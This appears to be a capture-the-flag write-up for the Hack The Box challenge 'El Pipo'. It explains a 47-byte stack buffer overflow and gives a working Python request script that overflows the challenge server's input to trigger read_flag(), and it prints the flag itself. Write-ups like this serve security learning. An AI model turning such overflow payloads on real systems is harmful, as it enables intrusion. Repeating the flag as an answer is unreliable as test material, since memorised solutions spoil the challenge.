# El Pipo

## Summary

Simple buffer overflow: 32-byte buffer, `target` byte at offset +47, `read()` reads up to 64 bytes. Overwrite target with any non-1 value to call `read_flag()`.

## Solution

### Step 1: Find the offset

`buffer` at `rbp-0x30`, `target` at `rbp-0x1`. Offset = `0x30 - 0x01 = 47` bytes.

### Step 2: Overflow

Send 47 bytes of padding + a null byte to overwrite `target` from 1 to 0.

The remote server serves the binary via a web form (`POST /process` with JSON body).

```python
import requests

payload = 'A' * 47 + '\x00'
r = requests.post('http://154.57.164.71:30438/process',
                   json={'userInput': payload}, timeout=10)
print(r.text)
```

## Flag

```
HTB{3l_p1p0v3rfl0w_w1th_w3b}
```
